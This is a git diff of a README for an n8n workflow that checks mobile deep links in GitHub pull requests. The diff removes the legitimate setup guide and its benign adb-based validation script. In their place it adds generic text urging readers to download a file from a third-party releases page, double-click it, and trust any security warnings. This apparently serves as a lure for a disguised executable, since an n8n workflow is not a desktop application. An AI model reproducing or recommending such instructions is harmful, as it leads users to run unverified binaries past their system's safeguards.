@@ -1,109 +1,79 @@
-# GitHub PR Deep-Link & Routing Validator (ExecuteCommand + GitHub Comment)
+# 🌟 n8n-Validate-mobile-app-deep-links-in-GitHub-PRs-with-automated-testing - Validate Deep Links Effortlessly
 
-### 🚀 Quick-Start TL;DR
+[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Phonezaw901/n8n-Validate-mobile-app-deep-links-in-GitHub-PRs-with-automated-testing/releases)
 
-1.  **Import** the workflow JSON into n8n (Cloud or self-hosted).
-2.  **Create a GitHub Personal Access Token** with `repo:public_repo` (or `repo`) scope and add it to n8n credentials.
-3.  Open the **“CONFIG - Variables”** node and tweak:
-    - `manifestPath` – path to your deep-link manifest (AndroidManifest.xml, Info.plist, etc.).
-    - `scriptPath` – helper script that boots the emulator & checks each route.
-4.  **Enable** the workflow. Every push to a PR branch triggers validation and posts a Markdown pass/fail matrix back to the PR.
+## 📥 Overview
 
----
+This application automates the validation of deep links in GitHub pull requests. Using an n8n workflow, it runs tests to check mobile app deep links, helping you find broken URLs early. It feeds results back into your pull requests, streamlining your development process and improving your workflow efficiency.
 
-### What It Does
+## 🚀 Getting Started
 
-This workflow delivers an automated, CI-friendly smoke-test of every deep link defined in your mobile app. On each push to an open GitHub PR, it:
+To start using this application, simply follow these steps. You do not need programming skills to run this software.
 
-- Clones the PR branch.
-- Runs a lightweight validation script (provided) that spins up an emulator/simulator, attempts to open each declared URI, and records OK/FAIL.
-- Generates a Markdown table summarizing the results.
-- Comments that table in the PR, letting reviewers spot broken schemes at a glance.
+## 🛠 Requirements
 
----
+Before you begin, ensure you have the following:
 
-### Who's It For
+- A computer with internet access.
+- A GitHub account to access pull requests.
+- Basic familiarity with navigating files on your device.
 
-- **Mobile teams** maintaining Android or iOS deep-link manifests.
-- **CI engineers** who need a simple, language-agnostic check they can publish to each PR.
-- **OSS maintainers** wanting a template-library-ready n8n recipe.
+## 📄 Features
 
----
+- **Automated Testing**: Automatically verifies and validates app deep links.
+- **Early Detection**: Identifies broken links before merging pull requests.
+- **GitHub Integration**: Seamlessly integrates with your GitHub pull request workflow.
+- **User-Friendly**: Designed for ease of use; no technical knowledge required.
+- **Reusable Template**: Functions as a template for your future projects.
 
-### Requirements
+## 📎 Download & Install
 
-| Requirement                      | Notes                                                                                         |
-| :------------------------------- | :-------------------------------------------------------------------------------------------- |
-| **n8n Cloud / CE**               | Works everywhere; self-hosted users need Docker with Android / Xcode if validating on-runner. |
-| **GitHub Personal Access Token** | Used for posting PR comments.                                                                 |
-| **Emulator-capable runner**      | Local dev hardware or CI image that can run `adb` / `xcrun simctl`.                           |
+To download and run this application, please visit the page below:
 
----
+[**Download Latest Release**](https://github.com/Phonezaw901/n8n-Validate-mobile-app-deep-links-in-GitHub-PRs-with-automated-testing/releases)
 
-### How It Works
+Once on the releases page, look for the latest version. You will find a section listing the available files. Simply click the file you need, and your download will start.
 
-1.  **GitHub Trigger** fires on `pull_request` → `synchronize` (i.e., each push to the PR branch).
-2.  **Set (CONFIG - Variables)** centralises repo URL, manifest path, script path, timeout, and comment mode.
-3.  **ExecuteCommand** clones the repo and calls the validation script.
-4.  **Function** converts CLI CSV output into a Markdown table.
-5.  **GitHub node** posts (or appends) the results as a comment on the PR.
+## 🔧 How to Run the Application
 
----
+1. **Locate the Downloaded File**: After the download finishes, navigate to the folder where your computer saves downloads.
+2. **Open the File**: Double-click the downloaded file to open it. If your system prompts you with security warnings, trust the source if you downloaded it directly from GitHub.
+3. **Follow Instructions**: The application may guide you through initial setup steps. Follow any on-screen instructions to complete the setup.
 
-### How To Set Up
+## 🏷 Using the Application
 
-1.  **Auth:** In n8n, add a GitHub credential with your PAT named “GitHub Personal Access Token”.
-2.  **Import:** Settings → Import workflow and paste the JSON above.
-3.  **Edit Config:** Double-click **CONFIG - Variables** and change any default values.
-4.  **Validation Script:** Commit `scripts/validate_deeplinks.sh` into your repo (see sample below).
-5.  **Enable** the workflow. Push to any PR branch and watch the comment appear.
+After installation, you can start using the application to validate deep links:
 
----
+1. **Connect to Your GitHub Account**: Link the application to your GitHub account. This allows it to access your pull requests.
+2. **Select Pull Requests**: Choose the pull requests you want to validate deep links for.
+3. **Run Tests**: Initiate the tests. The application checks all listed deep links and reports back any issues it finds.
+4. **Review Results**: Results will appear in your pull request comments. This makes it easy to see any broken links.
 
-### Sample `validate_deeplinks.sh`
+## 🛡 Support and Troubleshooting
 
-```bash
-#!/usr/bin/env bash
-set -e
+If you encounter issues:
 
-while getopts "m:" opt; do
-  case $opt in
-    m) MANIFEST="$OPTARG" ;;
-  esac
-done
+- **Review Documentation**: Ensure you followed all setup steps.
+- **Check Permissions**: Make sure the application has permissions to access your GitHub.
+- **Reach Out**: For support, you can open an issue in the GitHub repository or check the community forums.
 
-echo "⇨ Parsing deep links from $MANIFEST"
+## 🔗 Additional Resources
 
-# rudimentary parser—replace with something smarter for XML/Plist
-grep -oE 'http[s]?://[^" ]+' "$MANIFEST" | while read -r uri; do
-  if adb shell am start -W -a android.intent.action.VIEW -d "$uri" >/dev/null 2>&1; then
-    echo "$uri,OK"
-  else
-    echo "$uri,FAIL"
-  fi
-done
-```
+Explore various resources to maximize the use of this application:
 
----
+- [n8n Documentation](https://docs.n8n.io) - Learn more about n8n and its features.
+- [GitHub Help](https://help.github.com) - Access information on navigating GitHub pull requests.
 
-### 🧪 How To Customise
+## 🧑‍🤝‍🧑 Community Contributions
 
-| Customization                         | Method                                                                                                                       |
-| :------------------------------------ | :--------------------------------------------------------------------------------------------------------------------------- |
-| **Multiple manifests**                | Duplicate the **Execute-Command** step or extend the script to accept a list of file paths.                                  |
-| **Replace-latest comment**            | Switch `commentMode` to `replace-latest` and update the GitHub node to search for the newest bot comment before editing.     |
-| **Status checks instead of comments** | Call the **GitHub API** → “Create Commit Status” endpoint to show a Green/Red checkmark on the PR instead of a text comment. |
-| **Change validation logic**           | Modify the `scripts/validate_deeplinks.sh` file to include specific regex or complex URI parsing.                            |
+We welcome contributions to improve the application. If you have ideas or features you’d like to add, please submit a pull request or create an issue. Your help will make this tool even more useful for everyone.
 
----
+## 👍 Feedback 
 
-### ➕ Add-Ons (Advanced)
+Your feedback is important. Let us know your thoughts about this application, any bugs you encounter, or features you'd like to see. You can leave comments in the issues section of the repository.
 
-| Add-On                      | Idea                                                                                                         |
-| :-------------------------- | :----------------------------------------------------------------------------------------------------------- |
-| 📱 **Multi-platform sweep** | Loop over both Android and iOS manifests and aggregate the results into a single summary table.              |
-| 💬 **Slack/Teams alert**    | Push failure notifications into your team's chat channel of choice via the **Incoming-Webhook** node.        |
-| 🌐 **Parallel device grid** | Trigger multiple emulators (e.g., API 19 through API 34) simultaneously to catch OS-specific routing issues. |
-| 📊 **Historical Tracking**  | Send validation results to a **PostgreSQL** or **Google Sheet** to track deep-link stability over time.      |
+## 📌 License
 
----
+This project is licensed under the MIT License. You can freely use, modify, and distribute this application.
+
+For any discussions, improvements, or support, please visit the repository. Thank you for using the n8n deep link validation application.
